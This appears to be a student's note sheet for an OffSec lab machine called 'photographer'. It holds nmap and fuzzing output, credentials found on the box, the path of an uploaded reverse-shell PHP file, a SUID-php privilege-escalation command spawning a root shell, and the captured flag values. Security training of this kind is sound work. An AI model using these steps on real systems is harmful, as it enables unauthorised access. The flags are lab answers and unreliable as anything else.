=========================================================================
https://portal.offsec.com/labs/play
[OS]: Ubuntu 

[Web-Technology]: php

[Hostname]: photographer

[IP]:  192.168.217.76

[USERS]:
v1n1v131r4
Daisa

[CREDENTIALS]:
`daisa@photographer.com:babygirl`

=========================================================================
[To-Try LIST]:
22/tcp   open  ssh         [not yet]
80/tcp   open  http        [nothing here] (Nikto, Wfuzz, Gobuster)
139/tcp  open  netbios-ssn [obtain some file (mailtosent.txt, wordpress_bck.zip)]
445/tcp  open  netbios-ssn (smbclient, enum4linux, smbmap)
8000/tcp open  http        [/admin] (Nikto, Wfuzz, Gobuster, burp)

=========================================================================
```bash
[NMAP RESULTS]:

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:4d:aa:18:86:94:8e:88:a7:4c:6b:42:60:76:f1:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq9GoYsvJTOUcsgHSES9+20Ix4Q8wjm5slMheJ2ME+COokAqxBzXSr458KBmHv3bsTLWAH9FxoXJ6zrzDPmPApcqVifB4aI9l/VYxoeJCj54kKIQlCKkWTZjsAeLBI2Lk2+yJLLFWPTAZ2htwRAwCl9z8YV3xgtqhTa+5BqIm/GInW4PYV0zi9zOMn2g4jNSWvy91FBUboGLwVgNYslGBydNW8Fhz8X/LXHZ1x6ulA76W026VEGOiQfoiIi84IFi9CbP8GIKfQ7BHuDlMqgiN9+w7K0z0oFdtiFhAS/48w89MYn6UOzw7Aaa9eLQi0+zxpW5SpCpw0mC2euzPxow2Z
|   256 4d:a3:d0:7a:8f:64:ef:82:45:2d:01:13:18:b7:e0:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz4UG2gfu7L/Lxcqek1pZf46d8SocbES1A2a/XUYQgTmIqJuCEpLf3ERgVXS+7Lwdi6+F3xkI/lYFCA5MkRUQA=
|   256 1a:01:7a:4f:cf:95:85:bf:31:a1:4f:15:87:ab:94:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL5ZwzA5dpqtWx4ZzjVQ6NMzVUia8/We8txfiAn+mv4
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
|_http-generator: Koken 0.22.24
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   PHOTOGRAPHER<00>     Flags: <unique><active>
|   PHOTOGRAPHER<03>     Flags: <unique><active>
|   PHOTOGRAPHER<20>     Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10990/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15468/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 47220/udp): CLEAN (Failed to receive data)
|   Check 4 (port 33104/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2024-04-04T20:34:28-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-05T00:34:29
|_  start_date: N/A
|_clock-skew: mean: 1h20m36s, deviation: 2h18m34s, median: 35s
```
=========================================================================
[Web Services Enumeration]:

Directories [port:80]
===============================================================
/assets               (Status: 301) [Size: 317] [--> http://192.168.217.76/assets/]
/images               (Status: 301) [Size: 317] [--> http://192.168.217.76/images/]


Files [port:80]


Directories [port:8000]
=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000003:   200        38 L     78 W       1020 Ch     "admin"                      
000000049:   200        53 L     203 W      3163 Ch     "category"                   
000000046:   200        54 L     207 W      3140 Ch     "tag"                        
000000064:   500        57 L     159 W      2073 Ch     "page"                       
000000081:   200        54 L     205 W      3206 Ch     "content"                    
000000090:   200        53 L     200 W      3054 Ch     "error"                      
000000098:   200        9 L      12 W       114 Ch      "app"                        
000000097:   301        0 L      0 W        0 Ch        "archives"                   
000000122:   200        53 L     203 W      3126 Ch     "tags"                       
000000130:   200        96 L     290 W      4560 Ch     "home"                       
000000233:   200        53 L     203 W      3171 Ch     "favorites"                  
000000245:   200        94 L     291 W      4602 Ch     "index"                      
000000295:   200        113 L    302 W      4261 Ch     "date"                       
000000386:   403        9 L      28 W       281 Ch      "icons"                      
000000731:   200        84 L     265 W      4521 Ch     "lightbox"                   
000000755:   200        54 L     205 W      3191 Ch     "albums"                     
000000761:   200        53 L     203 W      3136 Ch     "album"                      
000000862:   200        53 L     203 W      3180 Ch     "categories"                 
000000939:   403        9 L      28 W       281 Ch      "storage"                    
000001162:   200        54 L     203 W      3165 Ch     "contents"                   
^C000001531:   302        0 L      0 W        0 Ch        "merchant" 

Files [port:8000]
=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================

000000001:   200        94 L     291 W      4602 Ch     "index.php"      
000000149:   403        9 L      28 W       281 Ch      ".htaccess"      
000000180:   500        32 L     79 W       600 Ch      "api.php"        
000000371:   200        94 L     291 W      4602 Ch     "."              
000000529:   403        9 L      28 W       281 Ch      ".html"          
000000798:   403        9 L      28 W       281 Ch      ".php"           
000000941:   403        0 L      0 W        0 Ch        "dl.php"         
000000966:   403        0 L      0 W        0 Ch        "a.php"          
000001307:   302        0 L      0 W        0 Ch        "status.php"


http://192.168.217.76:8000/storage/originals/f5/d5/revshell.php

=========================================================================
[OTHER / PRIVILEGE-ESCALATION]:

find / -perm -u=s -type f 2>/dev/null

cd /usr/bin/php7.2
CMD="/bin/sh"
./php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"


`local.txt:a5d769da5f1afda1708e22a6c901f9b1`

`proof.txt:c6081d490127f0aaa649219a25585261`

=========================================================================
Take Away Concepts (for the flat-file reference system):
* Always check for direcotories and file seperately
* try different tools
* 